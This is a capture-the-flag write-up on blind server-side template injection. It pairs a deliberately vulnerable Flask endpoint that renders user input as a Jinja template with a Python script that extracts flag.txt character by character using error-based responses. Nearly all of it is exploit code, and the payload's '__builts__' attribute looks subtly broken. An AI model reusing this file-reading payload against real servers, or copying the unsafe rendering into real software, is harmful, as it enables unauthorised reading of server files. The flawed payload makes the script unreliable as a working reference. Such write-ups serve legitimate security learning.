Blind SSTI
</br>
__my source web__
```
#!/usr/bin/env python3.9

from flask import Flask, render_template_string, request
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

app = Flask(__name__)
limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["10000 per hour"]
)


@limiter.limit("5/second", override_defaults=True)
@app.route('/')
def index():
    return ("\x3cpre\x3e\x3ccode\x3e%s\x3c/code\x3e\x3c/pre\x3e")%open(__file__).read()


@limiter.limit("5/second", override_defaults=True)
@app.route('/ssti')
def check():
    flag = open("flag.txt", 'r').read().strip()
    if "input" in request.args:
        query = request.args["input"]
        print(render_template_string(query))
        return "Thank you for your input."
    return "No input found."


app.run('0.0.0.0', 5555)

```
__my solution__
```
import requests, string, time
arr =  '_' + string.printable

url = """http://puzzler7.imaginaryctf.org:5555/ssti?input={{%s}}"""
s = requests.session()

def blind(step):
    d = 0
    for char in arr:
        payload = f"""1 if lipsum.__globals__.__builts__.open('flag.txt','r').read()[{step}]=='''{char}''' else 1/0"""
        if s.get(url%payload).status_code==200:
            return char
        d += 1
        if d==4:
            d = 0
            time.sleep(1)   
    return None

def FLAG():

    f = ''  # ictf{I_really_hope_that_this_doesnt_k1ll_my_server}
    step = 0
    while 1:
        char = blind(step)
        if char == None:
            return f
        step += 1    
        f += char
        print('flag = ',f)  
print(FLAG())
```
